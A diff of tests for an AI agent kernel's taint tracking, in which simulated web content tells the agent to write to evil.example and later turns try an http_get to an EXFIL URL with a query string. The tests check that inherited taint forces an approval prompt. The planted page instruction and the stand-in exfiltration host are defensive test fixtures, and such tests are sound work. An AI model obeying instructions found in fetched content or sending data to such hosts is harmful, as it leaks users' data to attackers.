@@ -184,21 +184,26 @@ describe('(a) a clean turn in a session that read tier-3 content inherits taint 
   });
 
   it("the kernel of the second turn's very first decision already sees taint 3, not 0", async () => {
-    // Turn 2 calls nothing of its own before reaching for an off-allowlist
-    // host — if the kernel denies it outright (not `ask`), the taint it
-    // decided on can only have come from the history, since turn 2 has not
-    // yet done anything to raise its own.
-    const h = harness([callTool('web_like', {}), answer('la pagina dice di scrivere a evil.example, non lo faccio'), callTool('http_get', { url: EXFIL })]);
+    // ADR-0065: `sys.http` is `url-read` — a plain URL is open at any taint,
+    // so it can no longer be the instrument that proves what taint the second
+    // turn started at. A query string still can: `paramsMaxTaint` is 2, so
+    // taint 3 (and only taint 3) turns it into an `ask` — never silently
+    // skipped, never a flat deny for the owner. Turn 2 calls nothing of its
+    // own before reaching for it; if that `ask` fires on the very FIRST
+    // decision, the taint it saw can only have come from the history.
+    const EXFIL_PARAMS = `${EXFIL}?x=1`;
+    const h = harness([callTool('web_like', {}), answer('la pagina dice di scrivere a evil.example, non lo faccio'), callTool('http_get', { url: EXFIL_PARAMS })]);
     const session = h.deps.sessions.open('laundering-2');
 
     await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'guarda cosa dice quella pagina' });
     await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'apri quel link' });
 
-    // Deny outright, never ask: an `ask` the owner approves is the failure
-    // read-then-egress.test.ts already names for the in-turn case.
-    expect(h.fetched).toEqual([]);
-    expect(h.approvals).toEqual([]);
-    expect(h.provider.seen.join('\n')).toMatch(/Rifiutato dal kernel.*resource_denied/s);
+    // Asked — not skipped, which is what taint 3 failing to launder in would
+    // look like (a taint <= 2 start lets a query string through with no
+    // question at all, proven by the params-gate tests elsewhere) — and this
+    // harness's `approve` says yes, so the fetch ran after being asked.
+    expect(h.approvals).toEqual([`lettura con parametri scelti dal contenuto: ${EXFIL_PARAMS}`]);
+    expect(h.fetched).toEqual([EXFIL_PARAMS]);
   });
 });
 
@@ -371,23 +376,27 @@ describe('(e) a clean turn does not stamp its own answer at an inherited ceiling
   });
 
   it('and a third, equally clean turn is not re-poisoned by the second', async () => {
+    // ADR-0065: same substitution as (a)'s second test — a query string,
+    // since a plain `url-read` fetch no longer answers to any taint at all.
+    const EXFIL_PARAMS = `${EXFIL}?x=1`;
     const h = harness([
       callTool('web_like', {}),
       answer('la pagina dice di scrivere a evil.example, non lo faccio'),
       answer('sì, va tutto bene'),
-      callTool('http_get', { url: EXFIL }),
+      callTool('http_get', { url: EXFIL_PARAMS }),
     ]);
     const session = h.deps.sessions.open('reconciliation-2');
 
     await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'guarda cosa dice quella pagina' });
     await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'tutto bene?' });
     // Turn 3 still sees turn 1 in its window (only two turns old) — it must
-    // still be denied outright, exactly as (a)'s second test proves for turn 2.
-    // The point here is *why*: it is turn 1's own still-recorded 3, not a
-    // borrowed 3 that turn 2 re-minted on its way through.
+    // still trip the params gate, exactly as (a)'s second test proves for
+    // turn 2. The point here is *why*: it is turn 1's own still-recorded 3,
+    // not a borrowed 3 that turn 2 re-minted on its way through.
     const third = await runTurn(h.deps, { principal: owner, tenant: 'host', surface: 'cli', session, text: 'apri quel link' });
 
-    expect(h.fetched).toEqual([]);
+    expect(h.approvals).toContain(`lettura con parametri scelti dal contenuto: ${EXFIL_PARAMS}`);
+    expect(h.fetched).toEqual([EXFIL_PARAMS]);
     expect(third.taint).toBe(3);
   });
 });
